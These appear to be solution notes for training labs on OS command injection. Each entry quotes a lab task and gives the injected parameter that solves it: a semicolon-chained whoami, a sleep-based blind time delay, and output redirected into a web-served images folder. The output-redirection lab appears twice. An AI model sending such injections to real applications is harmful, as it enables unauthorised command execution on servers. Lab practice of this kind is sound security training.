```
Lab: OS command injection, simple case

APPRENTICE

This lab contains an OS command injection vulnerability in the product stock checker.

The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

To solve the lab, execute the whoami command to determine the name of the current user. 
```
```os
productId=1;whoami&storeId=1
```
---
```
Lab: Blind OS command injection with time delays

PRACTITIONER

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay. 
```
```os
email=test||sleep%2010||
```
---
```
Lab: Blind OS command injection with output redirection

PRACTITIONER

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:
/var/www/images/

The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

To solve the lab, execute the whoami command and retrieve the output.  
```
```os
email=test%7C%7Cwhoami%20%3E%20%2Fvar%2Fwww%2Fimages%2Fwhoami%2Etxt||
```
> Then go to /image?filename=whoami.txt

---
```
Lab: Blind OS command injection with output redirection

PRACTITIONER

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:
/var/www/images/

The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

To solve the lab, execute the whoami command and retrieve the output.  
```
```os
email=test%7C%7Cwhoami%20%3E%20%2Fvar%2Fwww%2Fimages%2Fwhoami%2Etxt||
```
> Then go to /image?filename=whoami.txt

---